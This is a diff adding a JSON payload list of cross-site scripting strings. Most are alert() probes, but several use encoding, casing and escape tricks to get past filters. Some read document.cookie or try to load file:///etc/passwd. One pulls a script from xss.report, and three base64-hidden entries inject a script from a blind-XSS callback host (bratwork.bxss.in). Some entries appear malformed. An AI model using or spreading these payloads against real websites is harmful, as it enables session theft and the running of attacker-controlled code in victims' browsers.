@@ -1,0 +1,25 @@
+{
+  "payloads": [
+    "<script>alert('XSS1')</script>",
+    "<img src='x' onerror='alert(\"XSS2\")'>",
+    "<svg onload='alert(\"XSS3\")'></svg>",
+    "<img src=x onerror=\"&#0000100&#0000111&#000099&#0000117&#0000109&#0000101&#0000110&#0000116&#000046&#0000119&#0000114&#0000105&#0000116&#0000101&#000040&#000039&#000060&#0000105&#0000102&#0000114&#000097&#0000109&#0000101&#000032&#0000115&#0000114&#000099&#000061&#0000102&#0000105&#0000108&#0000101&#000058&#000047&#000047&#000047&#0000101&#0000116&#000099&#000047&#0000112&#000097&#0000115&#0000119&#0000100&#000062&#000060&#000047&#0000105&#0000102&#0000114&#000097&#0000109&#0000101&#000062&#000039&#000041\">",
+    "<iframe srcdoc=\"<script>alert('XSS')</script>\"></iframe>",
+    "\"%3e%3cImG%20sRC=X%20OneRRoR=alert(document.cookie)%20\"%3c",
+    "home%26apos;-alert(1)//onclick=\"location='/home&apos;-",
+    "javascript%26colon;alert(1)href=\"javascript&colon;alert(1)\"",
+    "</base</sTyle/</scRIpt/</textArea/</noScript/</tiTle/--><h1/<h1>",
+    "<image/onerror=\"import('data:application/javascript;charset=utf-8;base64,YWxlcnQoZG9jdW1lbnQuZG9tYWluKTtjb25zb2xlLmxvZyhkb2N1bWVudC5kb21haW4pOy8v')//%27\"src><script>",
+    "<s\\Cr\\ipt\\>alert(document\\.cookie)<\\/s\\Cr\\ipt\\>\\;/\\/>",
+    "<Svg Only=1 OnLoad=confirm(atob(\"Q2xvdWRmbGFyZSBCeXBhc3NlZCA6KQ==\"))>",
+    "\"><script src=https://xss.report/c/h3rtz></script>",
+    "\"><input onfocus=eval(atob(this.id)) id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS\\.5zcmM9Imh0dHBzOi8vYnJhdHdvcmsuYnhzcy5pbiI7ZG9jdW1lbnQuYm9keS5hcHBlbmRDaGlsZChhKTs\\u003d\\u003d autofocus>",
+    "\"><img src=x id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS\\.5zcmM9Imh0dHBzOi8vYnJhdHdvcmsuYnhzcy5pbiI7ZG9jdW1lbnQuYm9keS5hcHBlbmRDaGlsZChhKTs\\u003d\\u003d onerror=eval(atob(this.id))>",
+    "\"><video><source onerror=eval(atob(this.id)) id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS\\.5zcmM9Imh0dHBzOi8vYnJhdHdvcmsuYnhzcy5pbiI7ZG9jdW1lbnQuYm9keS5hcHBlbmRDaGlsZChhKTs\\u003d\\u003d>",
+    "\"><iframe srcdoc=\"&#60;&#115;&#99;&#114;&#105;&#112;&#116;&#62;v&#97;r a&#61;l&#ert&#40;&#39;XSS&#39;&#41&#59;v&#97;r a&#61;l&#ert&#40;&#39;XSS&#39;&#41;v&#97;r a&#61;l&#ert&#40;&#39;XSS&#39;&#41;v&#97;r a&#61;l&#ert&#40;&#39;XSS&#39;&#41;&#60;&#47;&#115;&#99;&#114;&#105;&#112;&#116;&#62;\"\\></iframe>",
+    "javascript:alert(`Chromium SSRF to SSRF via URL download()`)",
+    "<a href=data:text/html;base64,YWxlcnQoJzxoMT5YTUw8L2gxPik=",
+    "\"><isindex formaction=\"javascript:confirm`OPENBUGBOUNTY`\">",
+    "<p/sVg/</sVg/</sCrIPt/</stYle/</texTarE/</tiTlE/--!><Svg/<script/Svg>"
+  ]
+}
